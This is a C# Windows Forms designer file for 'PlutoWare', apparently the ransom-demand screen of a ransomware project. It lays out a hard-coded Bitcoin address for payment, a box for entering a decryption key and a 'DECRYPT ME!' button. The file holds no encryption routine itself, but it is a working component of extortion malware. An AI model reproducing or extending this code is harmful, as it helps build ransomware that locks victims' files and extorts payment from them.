
namespace Plutus
{
    partial class pluto
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(pluto));
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.bitcoinAddr = new System.Windows.Forms.TextBox();
            this.Description = new System.Windows.Forms.Label();
            this.keyBox = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // pictureBox1
            // 
            this.pictureBox1.ErrorImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.ErrorImage")));
            this.pictureBox1.ImageLocation = ".\\Plutus\\img\\hadesb.jpg";
            this.pictureBox1.InitialImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.InitialImage")));
            this.pictureBox1.Location = new System.Drawing.Point(12, 12);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(258, 426);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // bitcoinAddr
            // 
            this.bitcoinAddr.BackColor = System.Drawing.Color.Maroon;
            this.bitcoinAddr.Enabled = false;
            this.bitcoinAddr.Font = new System.Drawing.Font("Microsoft YaHei", 12F, System.Drawing.FontStyle.Bold);
            this.bitcoinAddr.ForeColor = System.Drawing.Color.Black;
            this.bitcoinAddr.Location = new System.Drawing.Point(276, 396);
            this.bitcoinAddr.Multiline = true;
            this.bitcoinAddr.Name = "bitcoinAddr";
            this.bitcoinAddr.Size = new System.Drawing.Size(512, 42);
            this.bitcoinAddr.TabIndex = 1;
            this.bitcoinAddr.Text = "18SSoWkoxbi6FwJnAV744hBAexwhxzn6pg";
            this.bitcoinAddr.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // Description
            // 
            this.Description.AutoSize = true;
            this.Description.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
            this.Description.Location = new System.Drawing.Point(276, 12);
            this.Description.Name = "Description";
            this.Description.Size = new System.Drawing.Size(510, 312);
            this.Description.TabIndex = 2;
            this.Description.Text = resources.GetString("Description.Text");
            // 
            // keyBox
            // 
            this.keyBox.Font = new System.Drawing.Font("Microsoft YaHei", 7.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.keyBox.Location = new System.Drawing.Point(276, 348);
            this.keyBox.Multiline = true;
            this.keyBox.Name = "keyBox";
            this.keyBox.Size = new System.Drawing.Size(248, 42);
            this.keyBox.TabIndex = 3;
            this.keyBox.Text = "ENTER DECRYPTION KEY\r\n[The key gets trimmed]";
            this.keyBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // button1
            // 
            this.button1.Font = new System.Drawing.Font("Microsoft YaHei", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.Location = new System.Drawing.Point(530, 348);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(258, 42);
            this.button1.TabIndex = 4;
            this.button1.Text = "DECRYPT ME!";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // pluto
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Gold;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.keyBox);
            this.Controls.Add(this.Description);
            this.Controls.Add(this.bitcoinAddr);
            this.Controls.Add(this.pictureBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Name = "pluto";
            this.Text = "PlutoWare";
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.TextBox bitcoinAddr;
        private System.Windows.Forms.Label Description;
        private System.Windows.Forms.TextBox keyBox;
        private System.Windows.Forms.Button button1;
    }
}

